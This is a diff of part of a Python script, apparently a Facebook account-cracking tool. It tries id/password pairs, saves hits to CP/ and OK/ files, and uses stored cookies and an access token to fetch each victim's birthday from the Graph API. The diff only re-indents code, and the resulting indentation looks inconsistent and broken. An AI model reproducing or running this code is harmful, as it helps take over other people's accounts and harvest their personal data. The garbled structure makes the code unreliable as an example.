@@ -1435,21 +1435,21 @@ class crack:
                 elif sistem_login == 'tiga' : log = logger3(id,pw)
                 else:log = logger1(id,pw)
                 if log['status'] == 'cp':files_cp = "CP/%s.json"%(tanggal)
-          with requests.Session() as xyz:cookie = {'cookie':open('login/cookie.json','r').read()}
-          url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
-          req = xyz.get(url,cookies=cookie)
-          jso = json.loads(req.text)
-          ttt = jso["birthday"]
-          m,d,y = ttt.split("/")
-          m = bulan_ttl[m]
-          ttl = (' • %s %s %s'%(d,m,y))
+                with requests.Session() as xyz:cookie = {'cookie':open('login/cookie.json','r').read()}
+                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
+                req = xyz.get(url,cookies=cookie)
+                jso = json.loads(req.text)
+                ttt = jso["birthday"]
+                m,d,y = ttt.split("/")
+                m = bulan_ttl[m]
+                ttl = (' • %s %s %s'%(d,m,y))
         except:ttl = ('')
-          pcp = ('\r   %s──> %s • %s%s               '%(J,id,pw,ttl))
-          print(pcp)
-          self.cp.append("%s=%s"%(id,pw))
-          open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
-        break
-        elif log['status'] == 'ok':files_ok = "OK/%s.json"%(tanggal)
+               pcp = ('\r   %s──> %s • %s%s               '%(J,id,pw,ttl))
+               print(pcp)
+               self.cp.append("%s=%s"%(id,pw))
+               open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
+              break
+             elif log['status'] == 'ok':files_ok = "OK/%s.json"%(tanggal)
         try:
           with requests.Session() as xyz:cookie = {'cookie':open('login/cookie.json','r').read()}
           url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
